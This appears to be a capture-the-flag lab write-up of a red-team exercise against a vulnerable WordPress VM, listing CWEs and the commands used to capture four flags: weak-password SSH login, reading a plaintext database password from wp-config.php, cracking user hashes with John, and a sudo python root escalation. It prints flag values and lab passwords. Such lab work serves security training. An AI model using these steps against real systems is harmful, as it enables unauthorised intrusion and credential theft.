# **Red Team: Summary of Operations**

## TARGET 1

### Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

---

## Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

nmap -sV 192.168.1.110

![1](/Images/1/1.png)

---

## Critical Vulnerabilities

The CVE and CWE databases give us information of vulnerabilities found in the previous step. These vulnerabilities are potential points of entry:

Vulnerability | Description | Impact
---|---|---
**CWE-200** | Exposure of sensitive Information to an unauthorized actor | Allowing sensitive information to be compromised so easily can result in a breach that can have significant affects on your business
**CWE-521** | Weak Password Requirements | Not enforcing a password policy allows users to choose passwords that they can easily remember which are not typically secure.
**CWE-284** | The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor. | A user is able to execute elevated commands when they were not preauthorized to do so
**CWE-98** | An improper control of filename for include or require statement in PHP allows a LFI allowing remote attackers to execute arbitrary code | An attacker can execute commands on the web server remotely  allowing them to further compromise the target.

---

## Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**flag1:**  `flag1{b9bbcb33e11b80be759c4e844862482d}`

- **CWE-200** Exposure of sensitive Information to an unauthorized actor
    
    1. On google chrome input the `Url: 192.168.1.110/service.html`
    2. Right click / view page source code / click on 3 dot menu
    3. Search: flag1

     **Flag1**

    ![2](/Images/1/2.png)

---

**flag2:** `flag2{fc3fd58dcdad9ab23faca6e9a36e581c}`

- **CWE-521:** Weak Password Requirements

    Access to the system was obtained through this weakness. The product does not require users to use strong passwords. This vulnerability makes it easier for attackers to compromise user accounts. User Michael utilizes his username as a password. Hydra can easily brute-force the password. Nevertheless, guessing the password was the efficient choice.
    
    Exploit:

    ```
        ssh michael@192.168.1.110
        Password: michael
        cd ../../
        find -iname “*flag*” 2>/dev/null
        cat /var/www/flag2.txt
    ```

    **Flag2**

    ![3](/Images/1/3.png)

---

**flag3:**  `flag3{afc01ab56b50591e7dccf93122770cd2}`

- **CWE-284** Server does not properly restrict access to a resource

    Privilege escalation is preceded by this vulnerability. The root password to access the SQL database is reachable in plain text on the file wp-config.php
    
    Exploit:
    ```
    Nano wp-config.php
    Look down mysql database password
    mysql -u root -p
    Password: R@v3nSecurity
    ```

    ![4](/Images/1/4.png)

    ```
    mysql -u root -p
    mysql> show databases;
    mysql> use wordpress;
    mysql> show tables;
    mysql> select * from wp_posts;
    ```

    **Flag3**

    ![11](/Images/1/11.png)  

    >#### note: Flags 3 and 4 can be found in different ways. Look at the end of this report for alternative methods to find Flag3.

---

**flag4:**  `flag4{715dea6c055b9fe3337544932f2941ce}`

- **CWE-284** Improper Access Control

    Privilege on the system is obtained in this step after cracking the hashed password of a privileged user found in the SQL database. This allows to execute a Python Script that leads to a root access to the system.

- **CRACKING THE HASH PASSWORD**

    Exploit:

    1. In the sql database run: 

        ```
        mysql> show databases;
        mysql> use wordpress;
        mysql> show tables;
        mysql> SELECT* FROM wp_users;
        ```

        ![5](/Images/1/5.png)

    2. Create a file with the hashes and usernames in john the ripper format

        ![6](/Images/1/6.png)
        
            John hashes.txt -wordlist=’usr.share/wordlist/rockyou.txt’
        
        ![7](/Images/1/7.png)
    
- **PRIVILEGE ESCALATION USING A PYTHON SCRIPT**
    
    The user Steven has python root access. This led to a root privilege escalation.

    Exploit:
    
    1. Steven has the privilege to run python language as a root user
        ```   
            su steven
            Password: pink84
            sudo -l  
        ```
    
        ![8](/Images/1/8.png)

    2. Python Script
    
        sudo python -c 'import pty;pty.spawn("/bin/bash")'
 
        ![9](/Images/1/9.png)
    
        cat /root/flag4.txt
    
        **Flag4**

        ![10](/Images/1/10.png)

***

# Alternative methods to access flag 3 and 4

## Binary File: **Flag 3**

1. Needs to be Root
2. In the directory:  /var/lib/mysql 

    ```
    grep -r flag3 *
    nano lib_logfile0
    ctrl w flag3
    ```

**Flag3**

![12](/Images/1/12.png)

## SQL database: **Flag 3 and 4**

```
mysql -u root -p
mysql> show databases;
mysql> use wordpress;
mysql> show tables;
mysql> select * from wp_posts;
```

  **Flag3 and Flag4**
 
![11](/Images/1/11.png)



> Others Exploits:
CVE-2014-6271 Shellshock vulnerability. It is possible to gain shell access through Remote code execution.